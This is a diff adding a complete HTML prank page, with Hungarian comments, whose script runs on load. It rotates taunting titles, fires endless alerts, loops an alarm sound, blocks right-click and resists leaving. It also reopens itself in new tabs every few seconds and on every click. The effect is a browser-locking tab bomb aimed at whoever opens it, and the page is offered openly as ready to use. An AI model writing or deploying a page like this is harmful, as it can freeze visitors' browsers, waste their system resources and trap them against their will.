@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>You can't leave 😈</title>
+  <script>
+    // Dinamikus címváltozás
+    const titles = ["😈 LOL", "😱 DON'T CLOSE", "👀 I'M WATCHING", "💀 STILL HERE?"];
+    let titleIndex = 0;
+
+    function rotateTitle() {
+      setInterval(() => {
+        document.title = titles[titleIndex % titles.length];
+        titleIndex++;
+      }, 1000);
+    }
+
+    // Végtelen alert
+    function infiniteAlerts() {
+      setInterval(() => {
+        alert("STILL HERE? 😂");
+      }, 3000);
+    }
+
+    // Hang lejátszás
+    function annoyingAudio() {
+      const audio = new Audio("https://actions.google.com/sounds/v1/alarms/beep_short.ogg");
+      audio.loop = true;
+      audio.play().catch(() => {});
+    }
+
+    // Tiltja a jobbklikket
+    window.oncontextmenu = function (e) {
+      alert("NOPE 😈");
+      e.preventDefault();
+      return false;
+    };
+
+    // Elhagyás tiltása
+    window.onbeforeunload = function () {
+      return "You really thought you could leave?";
+    };
+
+    // Új ablakok nyitása – minden kattintásnál
+    function openTabsLoop() {
+      setInterval(() => {
+        for (let i = 0; i < 2; i++) {
+          let win = window.open(window.location.href, "_blank");
+          if (win) win.blur();
+        }
+      }, 4000); // 2 új fül 4 másodpercenként
+    }
+
+    // Extra szaporítás kattintással
+    document.addEventListener("click", () => {
+      for (let i = 0; i < 5; i++) {
+        window.open(window.location.href, "_blank");
+      }
+    });
+
+    // Indítás
+    window.onload = function () {
+      rotateTitle();
+      infiniteAlerts();
+      annoyingAudio();
+      openTabsLoop();
+    };
+  </script>
+</head>
+<body>
+  <h1 style="text-align:center; font-size: 3em;">😈 YOU ARE MINE NOW 😈</h1>
+  <p style="text-align:center;">Click anywhere. Try to leave. I dare you.</p>
+</body>
+</html>
